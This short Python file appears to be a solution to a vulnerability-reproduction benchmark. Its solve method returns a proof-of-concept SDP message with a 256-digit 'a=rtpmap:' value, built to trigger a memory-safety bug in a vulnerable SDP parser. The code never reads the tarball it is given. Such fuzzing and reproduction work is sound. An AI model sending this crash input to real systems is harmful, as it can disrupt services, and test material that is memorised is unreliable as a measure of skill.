import os
import tarfile
from typing import Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Heuristic PoC for SDP parser: an "a=rtpmap:" attribute whose value is
        # only digits and long enough to ensure heap-backed storage, ending at EOL.
        # Many buggy parsers scan digits via dereference-before-end checks.
        digits = b"9" * 256

        poc = (
            b"v=0\n"
            b"o=- 0 0 IN IP4 127.0.0.1\n"
            b"s=-\n"
            b"t=0 0\n"
            b"m=audio 9 RTP/AVP 0\n"
            b"a=rtpmap:" + digits + b"\n"
        )

        # If the tarball suggests a different line ending convention, still fine.
        # Keep PoC stable and small.
        return poc